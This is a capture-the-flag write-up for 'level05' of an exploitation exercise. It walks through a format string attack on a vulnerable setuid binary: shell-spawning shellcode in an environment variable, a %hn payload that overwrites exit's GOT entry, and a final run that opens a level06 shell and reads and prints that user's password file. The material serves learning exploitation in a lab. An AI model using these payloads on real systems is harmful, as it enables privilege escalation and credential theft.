## LEVEL 05
---
### For a better understanding of the levels and the solutions, I recommend you to read the [disassemble file](./asm/level05.asm) and the [source file](./src/level05.c). This README only contains the most important parts to solve the level.
---
### Security
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

#### For this level the usage of buffer overflow is possible, almost every security are removed.
---

This level is way shorted than the previous levels but that does means it's easier. I recommend that you read the entire source code to understand the rest of my explanation.

First thing I notice when I saw this level, is the usage of printf with a buffer. That means we can use a format string attack to leak and change the value of the program.

Second thing I notice is that the program doesn't use `ptrace` to prevent us from using a debugger. So we can use GDB again.

Third thing I didn't say any `system` call. That means we have to use a shellcode to get to flag.

And the last thing I notice is the call to `exit` at the end of the program. That means we can't overflow the return address but we can overwrite the address pointed by `exit<+0>`.

Now that we know what we have to do, the question is "How do we do it ?".

Before to do anything with GDB, I have to export the shellcode.

```bash
export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Now I search the address of this environment variable in our program.

```shell
(gdb) x/s *((char **)environ)
0xffffd889:	 "SHELLCODE=\220\220\220\220\220\220\220[...]
```

Perfect the address I will use is `0xffffd8a9`. Now I need to find the address of `exit<+0>`.

```shell
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   [...]
```

The address is `0x080497e0`. Now I will do the same this as the level3 of rainfall. I will write this address, then the value to overwrite it's value with `%n`.
The last thing I need is the distance between %esp and here my buffe is stored.

```shell
(gdb) x/x $esp
0xffffd610:	0xffffd638
```
Perfect the distance is `0x28` or `40` in decimal. Let's try to overwrite the address pointed by `exit`.

```shell
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + " %10$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + " %10$n"')


Breakpoint 1, 0x0804850c in main ()
(gdb) x/x 0x080497e0
0x80497e0 <exit@got.plt>:	0x00000005
```

Now I convert the address of my shellcode in decimal. 
`ffffd8a9 <==> 4294957225`

```shell
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + " %4294957225ld%10$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + " %4294957225ld%10$n"')

Breakpoint 1, 0x0804850c in main ()
(gdb) x/x 0x080497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

Oh, this is not what I expected, but why? The reason is that the number 4294957225 is too large to fit in a 32-bit register, and it may also be too long to be used as padding in `printf`. To solve this problem, I will use the `%hn` flag, which will write one WORD instead of one BYTE. For a more detailed explanation of how it works, I recommend reading the source code provided at the bottom of this README. It provides a well-explained description of the technique.

First we need to write two addresses, the address of `exit` and the address of `exit+2`.
To change word by word.

```shell
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"'
-- ADDRESS OF ONE --- ADDRESS OF TWO --- %{value to write}%{argument number where I change the value} --- %{value to write}%{argument number where I change the value}
```

Let's try it.

```shell
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10d%10$n" + "%20d%11$n"')
       100          -134415680

Breakpoint 1, 0x0804850c in main ()
(gdb) x/x 0x080497e0
0x80497e0 <exit@got.plt>:	0x00260012
```

Perfect, now I just need to change it with the address of my shellcode. But before I have to transform the address to fit in two WORD.

```
Initial address of shellcode -> 0xffffd8a9
First WORD : d8a9
- convert to decimal = 55465
- minus 8 = 55457 (Remove the addresses before)
==> 55457

Second WORD : ffff
- convert to decimal = 65535
- minus 8 = 65527 (Remove the addresses before)
- minus 55457 = 10070 (Remove the first WORD length)
==> 10070
```
Perfect now I just have to put it in my payload.

```shell
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$n" + "%10070d%11$n"')
[...]
(gdb) x/x 0x080497e0
0x80497e0 <exit@got.plt>:	0xffffd8a9
(gdb) q
$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55457d%10$n" + "%10070d%11$n"'; cat -) | ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

---

*Source :*

*https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf*